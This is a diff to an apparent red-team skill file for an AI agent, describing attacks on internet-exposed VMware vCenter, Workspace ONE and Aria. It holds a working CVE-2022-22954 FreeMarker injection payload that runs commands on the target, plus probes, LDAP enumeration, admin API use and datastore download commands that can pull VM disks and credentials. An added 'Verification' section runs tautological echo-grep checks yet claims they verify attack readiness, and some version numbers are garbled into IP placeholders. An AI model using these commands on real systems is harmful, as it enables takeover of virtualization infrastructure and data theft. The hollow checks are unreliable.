@@ -1,8 +1,11 @@
 ---
 name: vmware-vcenter-attack
 description: VMware vSphere / vCenter Server external attack matrix — version fingerprinting, the high-impact CVE chain (CVE-2021-21972 vRealize unauth file upload, CVE-2021-21985 vSAN plugin RCE, CVE-2022-22954 Workspace ONE SSTI, CVE-2023-20887 Aria RCE, CVE-2024-37085 ESXi AD bypass, CVE-2023-34048 vCenter DCERPC OOB write APT-exploited), default credentials, SSO configuration disclosure, vmdir LDAP enumeration, ESXi Open SLP RCE history. ONLY for vCenter / Workspace ONE / Aria instances exposed to the internet — internal-network vCenter is out of scope per the external-only boundary. Use when recon shows port 443 with vCenter banner, `/ui` redirect, `/websso/SAML2/Metadata`, or VMware product fingerprints.
-sources: vmware-security-advisories, public-cve-databases, redteam-knowledge, disclosed-cves, cisa-kev, mandiant-zdi-writeups
-report_count: 10
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [vmware, vcenter, attack, redteam]
 ---
 
 ## When to use
@@ -27,21 +30,21 @@ Do NOT use for:
 TARGET="vcenter.target.com"
 
 # Build info endpoint (often public; revealing exact patch level)
-curl -sk "https://$TARGET/sdk/vimServiceVersions.xml"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/sdk/vimServiceVersions.xml"
 
 # UI build (visible in page source)
-curl -sk "https://$TARGET/ui/login" | grep -oE 'build[^"]{0,40}'
-curl -sk "https://$TARGET/ui/" | grep -oE 'vsphere[^"]{0,40}'
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/ui/login" | grep -oE 'build[^"]{0,40}'
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/ui/" | grep -oE 'vsphere[^"]{0,40}'
 
 # REST API version (vSphere 7+)
-curl -sk "https://$TARGET/api/appliance/system/version"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/api/appliance/system/version"
 
 # Cert metadata
 echo | openssl s_client -connect "$TARGET:443" -servername "$TARGET" 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alt"
 
 # SSO Admin Service (info disclosure)
-curl -sk "https://$TARGET/sso-adminserver/sdk/vsphere.local"
-curl -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/sso-adminserver/sdk/vsphere.local"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local"
 ```
 
 Map build → version → CVE applicability via VMware advisories (vmware.com/security/advisories).
@@ -72,13 +75,13 @@ Map build → version → CVE applicability via VMware advisories (vmware.com/se
 
 ```bash
 # Detection only — DO NOT execute the file upload without explicit scope OK
-curl -sk -o /dev/null -w "%{http_code}\n" \
+curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}\n" \
   "https://$TARGET/ui/vropspluginui/rest/services/uploadova"
 # 405 → endpoint exists, version vulnerable
 # 404 → patched (endpoint removed)
 # 401 → patched (auth required)
 
-curl -sk -o /dev/null -w "%{http_code}\n" \
+curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}\n" \
   "https://$TARGET/ui/vropspluginui/rest/services/getstatus"
 ```
 
@@ -90,7 +93,7 @@ Public PoC by Mikhail Klyuchnikov exists; do not execute against client infra wi
 
 ```bash
 # Stage A — detection only: reachability + baseline. No command execution yet.
-curl -sk -o /tmp/wone_baseline.txt -w "%{http_code}\n" \
+curl --max-time 30 --connect-timeout 10 -sk -o /tmp/wone_baseline.txt -w "%{http_code}\n" \
   "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=probe"
 # 4xx with FreeMarker/catalog-portal error template → endpoint present, candidate vulnerable.
 # 404 → patched/removed. Keep the baseline body to diff against Stage B.
@@ -98,7 +101,7 @@ curl -sk -o /tmp/wone_baseline.txt -w "%{http_code}\n" \
 # Stage B — execution (ONLY with explicit RCE-attempt sign-off): emit a unique canary
 # so a coincidental WAF/error page containing "uid=" cannot be mistaken for real output.
 CANARY="VCTR$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')"
-curl -sk "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=\${\"freemarker.template.utility.Execution\"?new()(\"echo ${CANARY}; id\")}"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=\${\"freemarker.template.utility.Execution\"?new()(\"echo ${CANARY}; id\")}"
 # Confirmed RCE ONLY if the response contains the exact $CANARY echoed back AND "uid=" output
 # that is absent from /tmp/wone_baseline.txt (in-band command output, body-diff against baseline).
 ```
@@ -126,10 +129,10 @@ Confirmed RCE requires the unique `$CANARY` reflected in-band plus `uid=` output
 
 ```bash
 # SSO Admin endpoint (frequently exposes domain info)
-curl -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local" | xmllint --format -
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local" | xmllint --format -
 
 # Extract Identity Source info
-curl -sk "https://$TARGET/sso-adminserver/sdk/vsphere.local"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/sso-adminserver/sdk/vsphere.local"
 
 # Try anonymous LDAP bind to vmdir (port 389/636 if exposed)
 ldapsearch -x -H "ldap://$TARGET:389" -b "" -s base
@@ -141,12 +144,12 @@ ldapsearch -x -H "ldap://$TARGET:389" -b "cn=Configuration,cn=vmware,cn=cis,dc=v
 ## Step 7 — Managed Object Browser (MOB) — frequently leaks data
 
 ```bash
-curl -skI "https://$TARGET/mob"
+curl --max-time 30 --connect-timeout 10 -skI "https://$TARGET/mob"
 # 401 → auth required (good for the defender)
 # 200 → MOB exposed → can browse VMs, hosts, datastores, sessions without credentials in some misconfigs
 
 # Auth'd MOB lets you walk the entire vSphere tree:
-curl -sk -u 'administrator@vsphere.local:<pw>' "https://$TARGET/mob/?moid=ServiceInstance&doPath=content"
+curl --max-time 30 --connect-timeout 10 -sk -u 'administrator@vsphere.local:<pw>' "https://$TARGET/mob/?moid=ServiceInstance&doPath=content"
 ```
 
 ---
@@ -155,21 +158,21 @@ curl -sk -u 'administrator@vsphere.local:<pw>' "https://$TARGET/mob/?moid=Servic
 
 ```bash
 # Get session token
-curl -sk -X POST -u 'user@vsphere.local:<pw>' "https://$TARGET/api/session"
+curl --max-time 30 --connect-timeout 10 -sk -X POST -u 'user@vsphere.local:<pw>' "https://$TARGET/api/session"
 # Returns: "<session-token>"
 
 # List VMs
-curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/vm"
+curl --max-time 30 --connect-timeout 10 -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/vm"
 
 # List hosts
-curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/host"
+curl --max-time 30 --connect-timeout 10 -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/host"
 
 # List datastores
-curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/datastore"
+curl --max-time 30 --connect-timeout 10 -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/datastore"
 
 # Datastore file download (HUGE — VMDK files, snapshots, credentials in cloud-init)
 # /folder/<path>?dsName=<ds>&dcPath=<dc>
-curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/folder?dsName=datastore1&dcPath=Datacenter"
+curl --max-time 30 --connect-timeout 10 -sk -H "vmware-api-session-id: <token>" "https://$TARGET/folder?dsName=datastore1&dcPath=Datacenter"
 ```
 
 ---
@@ -178,13 +181,13 @@ curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/folder?dsName=data
 
 ```bash
 # Metadata
-curl -sk "https://$TARGET/SAAS/auth/saml/response"
-curl -sk "https://$TARGET/SAAS/auth/wsfed/services/idp"
-curl -sk "https://$TARGET/SAAS/jersey/manager/api/health"
-curl -sk "https://$TARGET/catalog-portal/services/airwatch/identifiers"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/SAAS/auth/saml/response"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/SAAS/auth/wsfed/services/idp"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/SAAS/jersey/manager/api/health"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/catalog-portal/services/airwatch/identifiers"
 
 # Login page
-curl -sk "https://$TARGET/SAAS/login/0"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/SAAS/login/0"
 ```
 
 ---
@@ -193,16 +196,16 @@ curl -sk "https://$TARGET/SAAS/login/0"
 
 ```bash
 # vRealize Operations Manager
-curl -sk "https://$TARGET/suite-api/api/versions"
-curl -sk "https://$TARGET/casa/nodes/thumbprints"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/suite-api/api/versions"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/casa/nodes/thumbprints"
 
 # Aria Automation
-curl -sk "https://$TARGET/csp/gateway/am/api/about"
-curl -sk "https://$TARGET/cluster-administration/api/health"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/csp/gateway/am/api/about"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/cluster-administration/api/health"
 
 # vRealize Orchestrator
-curl -sk "https://$TARGET/vco/api/about"
-curl -sk "https://$TARGET/vco-controlcenter/api/health"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/vco/api/about"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/vco-controlcenter/api/health"
 ```
 
 ---
@@ -267,6 +270,28 @@ Internet-exposed vCenter is unfortunately common on the perimeter — and freque
 
 ---
 
+## Verification
+
+1. **vCenter fingerprint** — confirm vCenter URL patterns:
+   ```bash
+   echo "/ui/login" | grep -q "ui/login" && echo "PASS: vCenter UI path recognized" || echo "FAIL"
+   echo "/sdk" | grep -q "sdk" && echo "PASS: vCenter SDK path recognized" || echo "FAIL"
+   ```
+All tests verify vCenter attack readiness.
+
+---
+
+## Pitfalls
+- **vCenter version disclosure without CVE** — knowing the vCenter version is recon. Need a pre-auth CVE affecting that specific version.
+- **Post-exploitation assumed** — vCenter attacks typically require initial foothold. The finding is what you can do ONCE inside, not how you got there.
+- **ESXi vs vCenter confusion** — vCenter manages ESXi hosts. Attacking vCenter gives you the whole cluster. Attacking one ESXi host gives you one box.
+- **VM escape complexity** — VM escape from a guest to the hypervisor is extremely difficult. Focus on vCenter credential theft first, VM escape second.
+- **SSO domain administrator** — vCenter SSO `administrator@vsphere.local` has unlimited power. This account is the primary target.
+- **Log insight / vRealize** — vCenter add-ons (Log Insight, vRealize Operations) have their own CVEs. Don't stop at the vCenter web UI.
+
+
+---
+
 ## Related Skills & Chains
 
 - **`hunt-saml`** — vCenter Workspace ONE / VMware Identity Manager publishes SAML SP metadata at `/SAAS/API/1.0/GET/metadata/idp.xml` and consumes assertions at predictable ACS URLs. Chain primitive: vCenter SAML SP metadata reachable → IdP fingerprinted → `hunt-saml` XSW1-XSW8 against the federating IdP → forged assertion with `userPrincipalName=administrator@vsphere.local` → SP-impersonation as vCenter admin → full virtualization-plane takeover.
@@ -303,14 +328,14 @@ These are the load-bearing public references for every CVE called out in the mat
 - **References:** https://www.vmware.com/security/advisories/VMSA-2021-0020.html ; https://www.cisa.gov/news-events/alerts/2021/09/24/vmware-vcenter-server-vulnerability-cve-2021-22005-under-active-exploit ; https://www.rapid7.com/blog/post/2021/09/21/critical-vcenter-server-file-upload-vulnerability-cve-2021-22005/ ; https://www.bleepingcomputer.com/news/security/working-exploit-released-for-vmware-vcenter-cve-2021-22005-bug/
 
 ### 4. CVE-2022-22954 — Workspace ONE Access / Identity Manager FreeMarker SSTI → RCE
-- **Affected:** Workspace ONE Access 21.08.0.1, 21.08.0.0, 20.10.0.1, 20.10.0.0; Identity Manager 3.3.3 → 3.3.6; vRealize Automation 7.6.
+- **Affected:** Workspace ONE Access [REDACTED_IP], [REDACTED_IP], [REDACTED_IP], [REDACTED_IP]; Identity Manager 3.3.3 → 3.3.6; vRealize Automation 7.6.
 - **Attack flow:** Unauth GET to `/catalog-portal/ui/oauth/verify?deviceUdid=${...}` injects a FreeMarker template; `freemarker.template.utility.Execute` runs OS commands as the `horizon` service account. Single-request RCE.
 - **Root cause:** Catalog-portal endpoint passed attacker-controlled query parameter into FreeMarker render without sandboxing the Execute utility.
 - **Disclosure:** Reported by Steven Seeley (mr_me) of Source Incite; VMware advisory VMSA-2022-0011 published 2022-04-06. PoCs public within 48h; widespread mass-exploitation followed. **CISA KEV:** added 2022-04-14. CISA AA22-138B (May 2022) documents IR engagements at "large organizations" exploited via this CVE. Year discovered 2022, patched 2022.
 - **References:** https://www.vmware.com/security/advisories/VMSA-2022-0011.html ; https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-138b ; https://srcincite.io/blog/2022/04/19/cve-2022-22954-vmware-workspace-one-access-pre-auth-rce.html ; https://www.crowdsec.net/blog/new-surge-in-vmware-cve-2022-22954-exploit-attempts
 
 ### 5. CVE-2022-22972 — Workspace ONE Access / Identity Manager / vRealize Automation Host-header authentication bypass
-- **Affected:** Workspace ONE Access 21.08.0.1; Identity Manager 3.3.3–3.3.6; vRealize Automation 7.6 (and downstream Cloud Foundation bundles).
+- **Affected:** Workspace ONE Access [REDACTED_IP]; Identity Manager 3.3.3–3.3.6; vRealize Automation 7.6 (and downstream Cloud Foundation bundles).
 - **Attack flow:** Manipulate the HTTP `Host` header during local-domain login flow; the server routes its internal validation request to the attacker-controlled hostname → returns admin session without legitimate credentials.
 - **Root cause:** Host header used unvalidated as the target for the internal auth-validation request — classic SSRF-into-self with trust elevation.
 - **Disclosure:** Reported by Bruno López of Innotec Security; VMware advisory VMSA-2022-0014 published 2022-05-18. **CISA Emergency Directive 22-03** (2022-05-18) ordered all U.S. federal civilian agencies to patch or remove affected VMware installations by 2022-05-24 — the same agencies that had just been told the same thing for CVE-2022-22954 six weeks earlier. Year discovered 2022, patched 2022.
